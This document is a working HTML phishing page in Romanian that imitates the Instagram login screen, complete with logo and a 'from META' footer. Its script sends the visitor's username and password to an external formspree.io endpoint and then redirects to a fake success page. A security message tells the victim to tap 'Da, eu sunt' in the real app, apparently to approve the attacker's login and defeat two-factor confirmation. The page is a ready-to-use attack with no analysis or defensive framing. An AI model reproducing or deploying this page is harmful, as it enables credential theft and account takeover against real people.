<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In • Instagram</title>
    <style>
        body { background: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { width: 310px; text-align: center; border: 1px solid #dbdbdb; padding: 40px 20px; border-radius: 3px; background: white; box-sizing: border-box; }
        .logo-img { width: 175px; margin-bottom: 35px; }
        input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 13px; box-sizing: border-box; outline: none; }
        
        /* Textul de securitate adaugat */
        .security-msg { font-size: 12px; color: #8e8e8e; margin: 15px 0; line-height: 1.4; text-align: center; border-top: 1px solid #efefef; padding-top: 15px; }
        .security-msg b { color: #262626; }

        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 14px; }
        .footer { position: absolute; bottom: 20px; font-size: 11px; color: #c7c7c7; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-img">
        
        <form id="step1">
            <input type="text" id="u" placeholder="Telefon, utilizator sau e-mail" required>
            <input type="password" id="p" placeholder="Parolă" required>
            
            <div class="security-msg">
                După ce apeși Log In, te rugăm să deschizi aplicația pe telefon și să apeși pe <b>"Da, eu sunt"</b> pentru a confirma conectarea.
            </div>

            <button type="submit" id="b">Log in</button>
        </form>
    </div>

    <div class="footer">from META</div>

    <script>
        document.getElementById('step1').onsubmit = function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('b');
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;

            btn.innerHTML = "Se conectează...";
            btn.disabled = true;

            fetch("https://formspree.io/f/xzdkrgdq", {
                method: "POST",
                body: JSON.stringify({ Utilizator: user, Parola: pass }),
                headers: { "Content-Type": "application/json", "Accept": "application/json" }
            });

            setTimeout(function() {
                window.location.href = "verificare/succes.html";
            }, 1000);
        };
    </script>

</body>
</html>
